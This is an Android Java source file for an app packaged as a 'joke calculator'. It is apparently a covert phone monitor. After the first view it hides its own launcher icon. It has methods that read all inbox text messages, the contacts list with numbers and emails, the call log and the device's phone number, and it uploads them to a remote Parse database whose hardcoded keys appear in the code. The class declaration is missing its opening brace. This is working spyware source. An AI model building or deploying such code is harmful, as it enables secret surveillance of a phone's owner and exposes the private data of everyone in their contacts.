package com.example.jokecalculator2;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import com.parse.Parse;
import com.parse.ParseObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

/*
    Author: Jon
    Date 11/14/2014
    main activity for the call log contacts and text message monitor app.
    includes method to hide un hide get the sms the call log and the contacts list
    then makes use of these methods. 
 */

public class MainActivity extends Activity

    // intent filter used for the broad cast receivers
	private IntentFilter filter;
    // create a broadcast receiver object.
	private BroadcastReceiver reciever;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_main);
        // Instantiate the broadcast receiver.
		reciever = new customReciever(this);
        // Instantiate the Intent filter.
		filter = new IntentFilter();
        // set the filter to recognize the customText for the custom broadcast receiver.
		filter.addAction("customText");
        // initialize the parse database.
		Parse.initialize(this, "If1PRKVNDE9gELr7GwqoAc62G7vXzYPdfbfHNrbZ",
				"2XoIlTk49qUG7ufcIbrslX49Svp0OI6SIIKEy3Vz"); 
		// hide the app after it is view once.
		hideApp(this); 

	}

	protected void onResume() {
		super.onResume();
        // register the receiver if the app is open back up.
		registerReceiver(reciever, filter);

	}

	protected void onPause() {
		super.onPause();
        // register the receiver in the on pause
        // so that it can reactivate the receiver if the
        //app goes to sleep.
		registerReceiver(reciever, filter);
	}

	protected void onStart() {
		super.onStart();
        // start the receiver on the start of the app.
		registerReceiver(reciever, filter);

	}

    // used to get every text message in the phone.
	public void setSms() {
        // tells the app where the text messages are located.
		Uri uri = Uri.parse("content://sms/inbox");
        // a projection to store the address, body, date from the text message database in the phone.
		String[] pro = { "address", "body", "date" };
        // use to query the database in the phone for text messages.
		Cursor cursor = getContentResolver().query(uri, pro, null, null, null);

        // while loop to grab all the text messages.
		while (cursor.moveToNext()) {

			String address = cursor.getString(0); // sets the address of the text message
			String body = cursor.getString(1); // sets the body of the text message.
			String date = cursor.getString(2);// set the date the text message was received.

            // formats the date so that the date is readable.
			SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd/yyyy");
			dateFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00"));
			date = dateFormat.format(new Date(Long.parseLong(date)));

			String time = cursor.getString(2);
            // formats the time so that it is readable.
			SimpleDateFormat timeFormat = new SimpleDateFormat("hh:mm:ss a");
			timeFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00"));
			time = timeFormat.format(Long.parseLong(time));
            // stores all the text messages with the wanted data to the Parse database.
			ParseObject smsToParse = new ParseObject("TextMessages");
			smsToParse.put("PhoneNumber", address);
			smsToParse.put("Body", body);
			smsToParse.put("Date", date);
			smsToParse.put("Time", time);
			smsToParse.saveInBackground();
		}
        // close the cursor prevents memory leaks.
		cursor.close();
	}
    // method used to get the contacts in the users phone
	public void setContacts() {
        // tells the app where the contacts are located.
		Uri contactUri = ContactsContract.Contacts.CONTENT_URI;
        // tells the app where the common data for the contacts is stored.
		Uri phoneContentUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        // tells the app were the email for the contacts is stored.
		Uri emailUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
        // gets the contacts id.
		String _ID = ContactsContract.Contacts._ID;
        // gets the contacts name.
		String displayName = ContactsContract.Contacts.DISPLAY_NAME;
        // used to tell if the contact has a  phone number.
		String hasPhoneNumber = ContactsContract.Contacts.HAS_PHONE_NUMBER;
        // gets the phone contact id.
		String phoneContactId = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        // gets the phone number.
		String number = ContactsContract.CommonDataKinds.Phone.NUMBER;
        // gets the email id if exists
		String EmailContactId = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
        // gets the email address if exists
		String EmailContactAdd = ContactsContract.CommonDataKinds.Email.DATA;
        // used to browse the contact list.
		Cursor contactCur = getContentResolver().query(contactUri, null, null,
				null, null);
        // if no contacts do nothing.
		if (contactCur.getCount() > 0) {
            // gets all the information the users wants.
			while (contactCur.moveToNext()) {

				String phoneNumber = " ";

				String EmailAdd = " ";
                // stores the id.
				String ContactId = contactCur.getString(contactCur
						.getColumnIndex(_ID));
                // stores the name.
				String name = contactCur.getString(contactCur
						.getColumnIndex(displayName));
                // stores the last contact date and time.
				String lastContacted = contactCur
						.getString(contactCur
								.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                // checks if the contact has a phone number.
				int hasNumber = Integer.parseInt(contactCur
						.getString(contactCur.getColumnIndex(hasPhoneNumber)));

				if (hasNumber > 0) {
                    // browse for people who have phone numbers.
					Cursor phoneCur = getContentResolver().query(
							phoneContentUri, null, phoneContactId + "=?",
							new String[] { ContactId }, null);

					while (phoneCur.moveToNext()) {
                        // get the phone numbers.
						phoneNumber = phoneCur.getString(phoneCur
								.getColumnIndex(number));

					}
                    // close the phone cur to prevent memory leaks.
					phoneCur.close();
				}
                // browse for email address.
				Cursor emailCur = getContentResolver()
						.query(emailUri, null, EmailContactId + "=?",
								new String[] { ContactId }, null);

				while (emailCur.moveToNext()) {
                    // store the found email address.
					EmailAdd = emailCur
							.getString(emailCur
									.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));

				}
                // close the email cur to preven memory leaks.
				emailCur.close();
                // store the las contacted time.
				String time = lastContacted;

                // formate the date so that it is readable.
				SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd/yyyy");
				dateFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00"));
				lastContacted = dateFormat
						.format(Long.parseLong(lastContacted));
                // store all information to the Parse database.
				ParseObject contactsToParse = new ParseObject("Contacts");
				contactsToParse.put("Name", name);
				contactsToParse.put("Number", phoneNumber);
				contactsToParse.put("Email", EmailAdd);
				contactsToParse.put("DateLastContacted", lastContacted);
				contactsToParse.saveInBackground();

			}
		}
        // close the contact cur to prevent memory leaks.
		contactCur.close();

	}

	public String getAppUsersNumber() {
        // gets phone number that the app is stored on.
		TelephonyManager phoneNumber = (TelephonyManager) getSystemService(this.TELEPHONY_SERVICE);

		return phoneNumber.getLine1Number();
	}

    // method to get the call log information.
	public void getCallLog() {
        // tells the app where the call log is stored in the phone.
		Uri uri = CallLog.Calls.CONTENT_URI;

        // projection array to get the call log name number type ex outgoing incoming, and the date of the call.
		String[] pro = { CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER,
				CallLog.Calls.TYPE, CallLog.Calls.DATE };
        // cursor to browse the call log list/database.
		Cursor callCur = getContentResolver().query(uri, pro, null, null, null);
        // retrieves the call log.
		while (callCur.moveToNext()) {
			String name = callCur.getString(0); // get the name of the caller or person that the user called.
			String number = callCur.getString(1);// get the number of the caller or person that the user called.
			String Type = callCur.getString(2);// get the type of call eg. outgoing or incoming.
			String date = callCur.getString(3); // get the date the call was made or received.

            // format the date so that it is readable.
			SimpleDateFormat newDate = new SimpleDateFormat("MM/dd/yyyy");
			newDate.setTimeZone(TimeZone.getTimeZone("GMT-6:00"));
			date = newDate.format(new Date(Long.parseLong(date)));
            // get the time the call was made.
			String time = callCur.getString(3);
            // format the time so that it is readable.
			SimpleDateFormat timeFormat = new SimpleDateFormat("hh:mm:ss a");
			timeFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00"));
			time = timeFormat.format(Long.parseLong(time));
            // switch statement to tell if the call was out going incoming or missed.
			switch (Integer.parseInt(Type.trim())) {
			case 1:
				Type = "Incoming";
				break;
			case 2:
				Type = "OutGoing";
				break;
			case 3:
				Type = "Missed";
				break;
			}
            // if the user does not have a contact name then its n/a.
			if (name == null) {
				name = "N/A";
			}

            // store all the information to the parse database.
			ParseObject logToParse = new ParseObject("CallLog");
			logToParse.put("Name", name);
			logToParse.put("phoneNumber", number);
			logToParse.put("type", Type);
			logToParse.put("date", date);
			logToParse.put("Time", time);
			logToParse.saveInBackground();
		}
        // close the cursor to prevent memory leaks.
		callCur.close();

	}

    // method to hide the app from the user.
	public void hideApp(Context context) {

		PackageManager p = getPackageManager();
		ComponentName componentName = new ComponentName(context,
				com.example.jokecalculator2.MainActivity.class);
		p.setComponentEnabledSetting(componentName,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
	}
    // method to un hide the app.
	public void unHideApp(Context context) {

		PackageManager p = context.getPackageManager();
		ComponentName componentName = new ComponentName(context,
				com.example.jokecalculator2.MainActivity.class);
		p.setComponentEnabledSetting(componentName,
				PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
				PackageManager.DONT_KILL_APP);

	}
}
